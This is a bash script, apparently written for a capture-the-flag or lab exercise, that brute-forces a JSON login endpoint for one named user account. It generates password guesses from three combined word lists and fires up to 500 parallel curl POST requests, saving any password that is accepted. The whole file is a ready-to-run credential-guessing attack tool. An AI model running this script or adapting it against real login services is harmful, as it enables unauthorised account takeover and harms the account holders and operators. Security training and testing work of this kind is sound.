#!/usr/bin/env bash
#Name: bruteforce.sh

HOST=target
PORT=13401
DEST=v1/auth/login
TARGET=http://${HOST}:${PORT}/${DEST}

MAX_JOBS=500
JOB_COUNTER=0
i=0

DICT1="words/nouns.txt"
DICT2="words/nums.txt"
DICT3="words/syms.txt"
GENERATOR=/usr/bin/combinator3
GEN_CMD="${GENERATOR} ${DICT1} ${DICT2} ${DICT3}"

USERNAME='guard.hopkins@hopsecasylum.com'
QUERY_PREFIX='{"username": "'"${USERNAME}"'", "password": "'
QUERY_SUFFIX='"}'

HEADER_FLAGS=(-H 'Content-Type: application/json')
FAIL_STRING='"error":"bad credentials"'
SUCCESS_FILE=success.txt
LOG_FILE=log.txt

rm -f ${SUCCESS_FILE} ${LOG_FILE}

$GEN_CMD | while IFS= read -r candidate; do

    (
        QUERY="${QUERY_PREFIX}${candidate}${QUERY_SUFFIX}"
        RESPONSE="$(curl -s -X POST ${HEADER_FLAGS[@]} -d "${QUERY}" "${TARGET}")";

        if ! echo ${RESPONSE} | grep -q "${FAIL_STRING}"; then
            echo "Username: ${USERNAME}"  | tee    ${SUCCESS_FILE}
            echo "Password: ${candidate}" | tee -a ${SUCCESS_FILE}
            break;
        fi

        echo -e "curl -s -X POST ${HEADER_FLAGS[@]} -d '${QUERY}' ${TARGET}\n${RESPONSE}\n" >> log.txt
    ) &

    JOB_COUNTER=$((JOB_COUNTER + 1))
    i=$((i+1))
    echo -ne "\rTried ${i} passwords..."

    if [ "${JOB_COUNTER}" -ge "${MAX_JOBS}" ]; then
        wait -n
        JOB_COUNTER=$(jobs -r | wc -l)
    fi

    if [ -f ${SUCCESS_FILE} ]; then break; fi
done

wait
sleep 1

if [ -f ${SUCCESS_FILE} ]; then
    echo -e "\nSUCCESS!"
    cat ${SUCCESS_FILE}
else
    echo -e "\nFailed to find any passwords using list"
fi
